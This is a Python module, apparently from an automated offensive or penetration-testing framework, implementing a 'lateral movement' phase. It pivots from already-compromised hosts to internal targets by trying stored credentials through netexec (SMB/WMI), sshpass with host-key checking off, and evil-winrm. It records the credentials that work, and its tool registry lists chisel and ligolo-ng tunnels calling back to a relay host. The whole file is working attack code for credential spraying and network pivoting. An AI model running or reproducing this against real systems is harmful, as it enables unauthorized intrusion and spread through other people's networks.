"""Lateral Movement Phase - Production Implementation (Expanded Toolset)."""
import logging, json, re
from core.config import FrameworkConfig
from core.credential_store import CredentialStore
from core.knowledge_base import KnowledgeBase, Finding, ExploitLog
from core.tool_executor import ToolExecutor

log = logging.getLogger(__name__)


class lateral_movement:
    TOOLS_REGISTRY = {
        "netexec": {"protocols": ["smb","wmi","winrm","mssql"]},
        "sshpass":      {},
        "chisel":       {"args": ["client", "{relay_ip}:{port}", "R:9090:localhost:9090"]},
        "ligolo_ng":    {"args": ["agent", "--server", "{relay_ip}:443"]},
        "hydra":        {},
        "evil-winrm":   {},
        "impacket_wmiexec": {"args": ["{target}", "-u", "{user}", "-p", "{pass}", "whoami"]},
    }

    def __init__(self, config: FrameworkConfig, kb: KnowledgeBase, cred_store: CredentialStore, prior_findings, prior_exploit_logs):
        self.config = config; self.kb = kb
        self.cred_store = cred_store
        self.prior_findings = prior_findings; self.prior_exploit_logs = prior_exploit_logs
        self.te = ToolExecutor(default_timeout=300)

    def build_task_list(self) -> list[dict]:
        tasks = []
        accessed = {l.target for l in self.prior_exploit_logs if l.status == "success"} | \
                   {f.target for f in self.prior_findings if f.category in ("access_granted", "credentials", "credential_compromise")}
        internal = {f.target for f in self.prior_findings if f.phase == "discovery" and f.category in ("open_ports","open_port","service")}
        targets_to_pivot = (internal - accessed) | set(self.config.target.targets)
        for pivot_src in accessed:
            for dest in targets_to_pivot:
                if self.te.resolve_binary("netexec"): tasks.append({"action": "pivot_cme_smb",  "source": pivot_src, "target": dest})
                if self.te.resolve_binary("netexec"): tasks.append({"action": "pivot_cme_wmi",  "source": pivot_src, "target": dest})
                if self.te.resolve_binary("sshpass"):      tasks.append({"action": "pivot_ssh",      "source": pivot_src, "target": dest})
                if self.te.resolve_binary("evil-winrm"):   tasks.append({"action": "pivot_winrm",    "source": pivot_src, "target": dest})
        return tasks

    def execute_task(self, task: dict):
        a = task["action"]
        if a == "pivot_cme_smb":  self._cme(task, "smb")
        elif a == "pivot_cme_wmi":self._cme(task, "wmi")
        elif a == "pivot_ssh":    self._ssh_pivot(task)
        elif a == "pivot_winrm":  self._winrm_pivot(task)

    def _cme(self, task: dict, proto: str):
        """Pivot via CME using credentials from CredentialStore."""
        creds = self.cred_store.get_credentials(target=task["target"], verified_only=False)
        if not creds:
            log.warning("No credentials for %s pivot to %s — skipping", proto.upper(), task["target"])
            return

        success_count = 0
        for cred in creds:
            user = cred.get("username", "default_user")
            password = cred.get("password", "")
            res = self.te.run("netexec", [proto, task["target"], "-u", user, "-p", password, "--local-auth"])
            if res.success:
                success_count += 1
                self.kb.add_exploit_log(ExploitLog(target=task["target"], technique=f"{proto.upper()}_Pivot", tool="cme", status="success"))
                self.kb.add_finding(Finding(phase="lateral_movement", target=task["target"], category="pivot", severity="high", title=f"Lateral {proto.upper()}: {task['source']} -> {task['target']}"))
                # Persist verified credential
                from core.credential_store import Credential
                self.cred_store.add_credential(
                    Credential(username=user, password=password, target=task["target"],
                               verified=True, source=f"{proto.upper()}_pivot",
                               notes=f"Verified via lateral {proto.upper()} movement from {task['source']}"),
                )
                break  # One working cred is enough

        if success_count == 0:
            log.warning("All credential attempts failed for %s pivot to %s", proto.upper(), task["target"])

    def _ssh_pivot(self, task: dict):
        creds = self.cred_store.get_credentials(target=task["target"], verified_only=False)
        if not creds:
            log.warning("No credentials for SSH pivot to %s — skipping", task["target"])
            return

        success_count = 0
        for cred in creds:
            user = cred.get("username", "default_user")
            password = cred.get("password", "")
            res = self.te.run("sshpass", ["-p", password, "ssh", "-o", "StrictHostKeyChecking=no", f"{user}@{task['target']}", "whoami"])
            if res.success:
                success_count += 1
                self.kb.add_exploit_log(ExploitLog(target=task["target"], technique="SSH_Pivot", tool="sshpass", status="success"))
                self.kb.add_finding(Finding(phase="lateral_movement", target=task["target"], category="pivot", severity="high", title=f"Lateral SSH: {task['source']} -> {task['target']}"))
                from core.credential_store import Credential
                self.cred_store.add_credential(
                    Credential(username=user, password=password, target=task["target"],
                               verified=True, source="ssh_pivot",
                               notes=f"Verified via SSH pivot from {task['source']}"),
                )
                break

        if success_count == 0:
            log.warning("All credential attempts failed for SSH pivot to %s", task["target"])

    def _winrm_pivot(self, task: dict):
        creds = self.cred_store.get_credentials(target=task["target"], verified_only=False)
        if not creds:
            log.warning("No credentials for WinRM pivot to %s — skipping", task["target"])
            return

        success_count = 0
        for cred in creds:
            user = cred.get("username", "default_user")
            password = cred.get("password", "")
            res = self.te.run("evil-winrm", ["-i", task["target"], "-u", user, "-p", password], timeout=30)
            if res.success:
                success_count += 1
                self.kb.add_exploit_log(ExploitLog(target=task["target"], technique="WinRM_Pivot", tool="evil-winrm", status="success"))
                self.kb.add_finding(Finding(phase="lateral_movement", target=task["target"], category="pivot", severity="high", title=f"Lateral WinRM: {task['source']} -> {task['target']}"))
                from core.credential_store import Credential
                self.cred_store.add_credential(
                    Credential(username=user, password=password, target=task["target"],
                               verified=True, source="winrm_pivot",
                               notes=f"Verified via WinRM pivot from {task['source']}"),
                )
                break

        if success_count == 0:
            log.warning("All credential attempts failed for WinRM pivot to %s", task["target"])

    def get_available_tools(self) -> list[str]:
        return [n for n in self.TOOLS_REGISTRY if self.te.resolve_binary(n.split("_")[0])]
